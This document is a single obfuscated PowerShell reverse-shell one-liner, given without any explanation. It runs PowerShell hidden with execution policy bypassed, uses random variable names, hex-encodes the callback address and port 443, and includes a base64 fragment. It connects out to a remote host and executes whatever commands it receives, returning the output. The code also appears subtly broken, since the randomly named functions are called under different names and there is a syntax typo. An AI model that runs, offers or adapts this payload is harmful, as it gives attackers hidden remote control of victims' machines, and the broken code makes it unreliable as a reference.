Start-Process $PSHOME\powershell.exe -ArgumentList {-ep bypass -nop -c function Get-RandomString { param ([int]$length = 8) -join ((65..90) + (97..122) | Get-Random -Count $length | % {[char]$_]) } $a=Get-RandomString; $b=Get-RandomString; $c=Get-RandomString; $d=Get-RandomString; $e=Get-RandomString; $f=Get-RandomString; $g=Get-RandomString; $h=Get-RandomString; $i=Get-RandomString; $j=Get-RandomString; Set-Variable -Name $a -Value '0xc0a8012f'; Set-Variable -Name $b -Value 0x1bb; function $(Get-RandomString) { $enc="JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCkKJHdyaXRlciA9IE5ldy1PYmplY3QgU3lzdGVtLklPLlN0cmVhbVdyaXRlcigkc3RyZWFtKQokcmVhZGVyID0gTmV3LU9iamVjdCBTeXN0ZW0uU3RyZWFtUmVhZGVyKCRzdHJlYW0pCg=="; Set-Variable -Name $j -Value ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($enc))); Invoke-Expression (Get-Variable -Name $j).Value } function $(Get-RandomString) { param ($ip, $port) try { $client=New-Object System.Net.Sockets.TCPClient($ip,$port); Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 1000); $stream=$client.GetStream(); $writer=New-Object System.IO.StreamWriter($stream); $reader=New-Object System.IO.StreamReader($stream); return @($client,$stream,$writer,$reader) } catch { Write-Error "Connection failed"; exit } } function $(Get-RandomString) { param ($client,$stream,$writer,$reader) while ($true) { Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 1000); $writer.Write((pwd).Path + "> "); $writer.Flush(); $command=$reader.ReadLine(); if ($command -eq "exit") { break }; $output=Invoke-Expression -Command $command 2>&1 | Out-String; $writer.WriteLine($output); $writer.Flush() } $client.Close() } $(Get-RandomString); $conn=$($(Get-RandomString)) -ip (Get-Variable -Name $a).Value -port (Get-Variable -Name $b).Value; $($(Get-RandomString)) -client $conn[0] -stream $conn[1] -writer $conn[2] -reader $conn[3]} -WindowStyle Hidden
